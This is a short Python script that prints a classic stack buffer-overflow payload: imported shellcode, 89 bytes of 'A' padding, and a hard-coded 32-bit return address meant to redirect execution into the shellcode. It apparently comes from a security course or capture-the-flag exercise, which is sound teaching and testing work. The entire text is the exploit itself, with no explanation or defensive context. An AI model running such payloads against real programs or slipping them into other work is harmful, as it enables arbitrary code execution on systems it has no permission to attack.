#!/usr/bin/python

from shellcode import shellcode
print (shellcode+"A"*89+"\xac\xb5\xfe\xbf")
